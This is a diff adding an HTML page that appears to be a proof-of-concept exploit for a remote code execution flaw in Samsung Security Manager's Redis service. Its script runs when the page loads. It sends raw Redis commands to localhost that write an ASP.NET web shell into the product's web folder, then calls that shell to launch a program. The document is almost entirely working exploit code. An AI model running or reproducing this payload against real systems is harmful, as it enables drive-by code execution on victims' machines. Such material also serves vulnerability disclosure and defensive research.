@@ -1,0 +1,69 @@
+<html>
+<body>
+<script>
+
+/*
+
+Samsung Security Manager Redis Server Injection Remote Code Execution Vulnerability
+SRC: SRC-2016-0033
+
+Test On:
+========
+
+Windows 7 Ultimate x86 (fully patched)
+- SSM v1.40.0151109
+- SSM v1.50.0160509
+
+Using Firefox and Chrome Latest
+
+Notes:
+======
+
+v1.4 can be exploited on the default 6379 redis port
+v1.5 can be exploited on the non-default 10001 port
+
+*/
+
+function send_request(string){
+  var x = new XMLHttpRequest();
+  x.open("POST", "http://127.0.0.1:10001"); // change to port 6379 for v1.4 
+  x.send(string);
+}
+
+function pop_calc(uri){
+  var x = new XMLHttpRequest();
+  x.open("GET", uri);
+  x.send();
+}
+
+function hack_redis(){
+
+  // CONFIG SET dir C:/PROGRA~1/Samsung/SSM/MediaGateway/WebViewer/
+  var set_config   = "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$47\r\nC:/PROGRA~1/Samsung/SSM/MediaGateway/WebViewer/\r\n";
+
+  // CONFIG SET DBFILENAME si.aspx
+  var set_shell    = "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\nDBFILENAME\r\n$7\r\nsi.aspx\r\n";
+
+  // SET payload <%=System.Diagnostics.Process.Start(request("c"),request("a"))%>
+  var set_payload  = "*3\r\n$3\r\nSET\r\n$7\r\npayload\r\n$64\r\n<%=System.Diagnostics.Process.Start(request(\"c\"),request(\"a\"))%>\r\n";
+
+  // BGSAVE
+  var write_shell  = "*1\r\n$6\r\nBGSAVE\r\n";
+  send_request(set_config);
+  send_request(set_shell);
+  send_request(set_payload);
+  send_request(write_shell);
+}
+
+// a few times just to be sure, making it 100% reliable
+var i = 0;
+while (i < 2) {
+  hack_redis();
+  i++;
+}
+
+pop_calc("http://127.0.0.1:4512/si.aspx?c=c:/Windows/System32/cmd.exe&a=/c+calc.exe");
+
+</script>
+</body>
+</html>
